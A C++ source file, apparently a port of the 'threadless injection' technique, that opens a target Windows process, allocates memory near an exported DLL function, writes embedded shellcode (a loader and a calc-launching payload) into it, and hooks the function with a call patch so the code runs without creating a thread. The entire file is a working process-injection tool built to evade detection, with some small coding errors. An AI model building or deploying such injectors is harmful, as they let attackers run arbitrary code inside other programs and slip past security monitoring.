/* Threadlesinject C++ version by 0x0ff537*/

#include <windows.h>
#include <stdio.h>

// NT Functions definitions
typedef NTSTATUS (NTAPI * NtAllocateVirtualMemory_t)(
    HANDLE    ProcessHandle,
    PVOID     *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

typedef (NTAPI * RtlMoveMemory_t)(
    VOID UNALIGNED *Destination,
    VOID UNALIGNED *Source,
    SIZE_T         Length
);

typedef NTSTATUS (NTAPI * NtWriteVirtualMemory_t)(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    ULONG   NumberOfBytesToWrite,
    PULONG  NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI * NtProtectVirtualMemory_t)(
    HANDLE  ProcessHandle,
    PVOID   *BaseAddress,
    PULONGLONG  NumberOfBytesToProtect,
    ULONG   NewAccessProtection,
    PULONG  OldAccessProtection 
);

// Payload
unsigned char calc_shellcode[] = {
    0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
    0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
    0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
    0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
    0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
    0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
    0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
    0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
    0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};
unsigned int calc_shellcode_size = sizeof(calc_shellcode);

// Payload loader
unsigned char loader_shellcode[] = {
    0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
    0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
    0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
    0xE0, 0x90, 0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
    0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
    0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
    0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
    0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
    0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
    0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
    0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
    0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};
unsigned int loader_shellcode_size = sizeof(loader_shellcode);

// Egghunt to look for space in the DLL memory load space
LPVOID FindMemHole(HANDLE hProc, ULONGLONG pFunc_addr, ULONG_PTR size) {

    LPVOID pAddr = NULL;
    BOOL found = FALSE;
    for(pAddr = (pFunc_addr & 0xFFFFFFFFFFF70000) - 0x70000000; (ULONGLONG)pAddr < pFunc_addr + 0x70000000; (ULONGLONG)pAddr += 0x10000){
        NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
        if(pNtAllocateVirtualMemory == NULL){
            printf("[-] Failed to resolve NtAllocateVirtualMemroy\n");
            break;
        }
        NTSTATUS *status = pNtAllocateVirtualMemory(hProc, &pAddr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if(status == 0x00000000){
            found = TRUE;
            break;
        }
    }

    if(found == FALSE){
        pAddr = NULL;
    }
    return pAddr;
}

void main(int argc, char *argv[]) {

    int pid;
    char *dll;
    char *function;
    HMODULE hModule;
    LPVOID pFunc_addr;
    HANDLE hProc;
    LPVOID pMemHole = NULL;
    LPVOID originalBytes = NULL;
    ULONGLONG relativeLoaderAddr;
    BYTE callOpcode[5] = {0xe8, 0, 0, 0, 0};
    ULONGLONG callOpcode_size = sizeof(callOpcode);
    NTSTATUS status;
    ULONG old;
    LPVOID pProtectMem;
    LPVOID pLoaderAddr;

    // Check arguments, make sure to pass the arguments in the correct order.
    if(argc < 4){
        printf("[-] Some arguments are missing\n[?] threadlessinject.exe <pid> <WellKnownDLL> <function name>\nMake sure to pass the arguments in the correct order!!\n");
        return;
    }

    pid = atoi(argv[1]);
    dll = argv[2];
    function = argv[3];

    printf("\n[*] PID = %d\n", pid);
    printf("[*] DLL = %s\n", dll);
    printf("[*] PID = %s\n", function);

    // Get DLL handle and find exported function
    hModule = GetModuleHandleA(dll);
    if(hModule == NULL){
        printf("[-] Failed to load module %s, make sure it's a known DLL\n", dll);
        return;
    }
    pFunc_addr = GetProcAddress(hModule, function);
    if(pFunc_addr == NULL){
        printf("[-] Failed to find exported function %s\n", function);
        return;
    }
    printf("[+] %s!%s at 0x%p\n", dll, function, pFunc_addr);
    
    // Opening process
    hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
    if(hProc == NULL){
        printf("[-] Failed to open process\n");
        return;
    }
    printf("[+] Handle process successfully obtained\n");
    
    // Find memory hole
    pMemHole = FindMemHole(hProc, (ULONGLONG)pFunc_addr, (ULONG_PTR)(calc_shellcode_size + loader_shellcode_size));
    if(pMemHole == NULL){
        printf("[-] Failed to find a memory hole\n");
        return;
    }
    printf("[+] Memory hole at 0x%p\n", pMemHole);

    // Get original bytes before patching
    RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlMoveMemory");
    pRtlMoveMemory(&originalBytes, pFunc_addr, (SIZE_T)8);

    // Generate hook
    pRtlMoveMemory(&loader_shellcode[18], &originalBytes, (SIZE_T)8);

    // Get relative address of memory hole and prepare patch
    relativeLoaderAddr = (ULONGLONG)pMemHole - ((ULONGLONG)pFunc_addr + 5);
    for(int i = 0; i < 4; i++){
        callOpcode[i + 1] = ((ULONG)relativeLoaderAddr >> (8 * i)) & 0xFF;
    }

    // Write Shellcode to memory hole
    NtProtectVirtualMemory_t pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
    if(pNtProtectVirtualMemory == NULL){
        printf("[-] Failed to resolve NtProtectVirtualMemory\n");
        return;
    }
    pLoaderAddr = pMemHole;
    pNtProtectVirtualMemory(hProc, &pLoaderAddr, (PULONGLONG)&loader_shellcode_size, PAGE_EXECUTE_READWRITE, &old);

    NtWriteVirtualMemory_t pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    if(pNtWriteVirtualMemory == NULL){
        printf("[-] Failed to resolve NtWriteVirtualMemory\n");
        return;
    }
    status = pNtWriteVirtualMemory(hProc, pMemHole, loader_shellcode, (ULONG)loader_shellcode_size, NULL);
    if(status != 0x00000000){
        printf("[-] Failed to write loader_shellcode\n");
        return;
    }
    
    // Patch the memory
    pProtectMem = pFunc_addr;
    pNtProtectVirtualMemory(hProc, &pProtectMem, &callOpcode_size, PAGE_EXECUTE_READWRITE, &old);
    
    status = pNtWriteVirtualMemory(hProc, pFunc_addr, callOpcode, (ULONG)5, NULL);
    if(status != 0x00000000){
        printf("[-] Failed to write callOpcode\n");
        return;
    }
    printf("[+] Shellcode and patched function ready!\n");
    CloseHandle(hProc);

}